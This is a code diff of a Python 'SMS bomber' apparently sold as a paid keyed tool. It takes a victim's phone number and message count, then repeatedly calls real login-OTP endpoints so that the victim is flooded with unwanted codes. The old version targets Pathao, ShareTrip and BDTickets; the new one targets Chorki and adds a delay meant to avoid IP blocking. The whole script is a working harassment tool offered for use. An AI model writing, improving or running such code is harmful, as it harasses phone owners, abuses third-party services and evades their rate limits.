@@ -5,14 +5,14 @@ import uuid
 
 def start():
     os.system('clear')
-    # আপনার টুলের লোগো (OTP স্টাইল)
+    # Tool Logo
     print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
     print('         ██    ██    ██    ██   ██ ')
     print('         ██    ██    ██    ██████  ')
     print('         ██    ██    ██    ██      ')
     print('          ██████     ██    ██      \033[0m')
     
-    # ইনফরমেশন বক্স (আপনার চাহিদা অনুযায়ী পরিবর্তন করা হয়েছে)
+    # Information Box
     line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
     print(line)
     print('\033[1;34m| [✓] DEVELOPED BY :  MD MALEK ISLAM        |')
@@ -22,42 +22,55 @@ def start():
     print('| [✓] TOOL VERSION :  MAX PRO 2026          |\033[0m')
     print(line)
     
-    # সালাম এবং টিমের নাম
-    print('\033[1;32m[•] SALAMU ALAIKUM.........................\033[0m')
+    # System Status
+    print('\033[1;32m[•] SYSTEM STATUS: ONLINE...................\033[0m')
     print(line)
     
-    # কি (Key) জেনারেটর - আপনার দেওয়া নাম 'MR-MALEK' শেষে যুক্ত করা হয়েছে
+    # Key Generator
     u_key = str(uuid.uuid4())[:8]
-    print(f'\033[1;32m[\033[1;31m❤️\033[1;32m] POWERFUL TOOL 10 DAYS ONLY 50TK [\033[1;31m❤️\033[1;32m]')
-    print(f'[\033[1;31m❤️\033[1;32m] KEY : {u_key}-MR-MALEK')
-    print(f'[\033[1;31m❤️\033[1;32m] COPY YOUR KEY AND SEND TO THE ADMIN [\033[1;31m❤️\033[1;32m]\033[0m')
+    print(f'\033[1;32m[!] PREMIUM TOOL - 10 DAYS ONLY 50TK [!]')
+    print(f'[!] KEY : {u_key}-MR-MALEK')
+    print(f'[!] COPY YOUR KEY & SEND TO ADMIN [!]\033[0m')
     print(line)
 
+    # Input Section
     target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
     amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))
     
-    # সাকসেস মেসেজ স্টাইল
-    print(f'\n\033[1;32mSuccess: True')
-    print('Status Code: 200')
-    print(f'Message: {target} যুক্ত হয়েছে।\033[0m\n')
+    print(f'\n\033[1;32m[*] Initializing Attack: True')
+    print('[*] Target Locked: Successfully\033[0m\n')
     
-    # আপনার দেওয়া Bdtickets এবং অন্যান্য API
-    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+    # API Configuration (Chorki)
+    url = "https://api-dynamic.chorki.com/v2/auth/login"
+    params = {"country": "BD", "platform": "web", "language": "en"}
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Origin": "https://www.chorki.com",
+        "Referer": "https://www.chorki.com/"
+    }
+    payload = {"number": target}
 
     for i in range(1, amount + 1):
         try:
-            # API রিকোয়েস্টগুলো
-            requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, headers=headers, timeout=10)
-            requests.post("https://api.sharetrip.net/api/v1/otp/send", json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=10)
-            requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
+            # Request Execution
+            response = requests.post(url, params=params, json=payload, headers=headers, timeout=10)
             
-            # আউটপুট ডিসপ্লে
-            print(f'\033[1;32m[{i}] SUCCESS SENT ==> {target}\033[0m')
-        except:
-            print(f'\033[1;31m[{i}] FAILED SENT ==> {target}\033[0m')
+            if response.status_code == 200 or response.status_code == 201:
+                print(f'\033[1;32m[{i}] STATUS: SUCCESS ==> {target}\033[0m')
+            else:
+                print(f'\033[1;31m[{i}] STATUS: FAILED (CODE: {response.status_code})\033[0m')
+        except Exception as e:
+            print(f'\033[1;31m[{i}] ERROR: {e}\033[0m')
         
-        # ৪ সেকেন্ড বিরতি
-        time.sleep(4)
+        # Delay to prevent IP blocking
+        if i < amount:
+            print(f'\033[1;34m[*] cooldown: 60 seconds...\033[0m')
+            time.sleep(60)
+
+    print(f"\n{line}")
+    print("\033[1;32m[!] MISSION COMPLETED\033[0m")
+    print(line)
 
 if __name__ == "__main__":
     start()
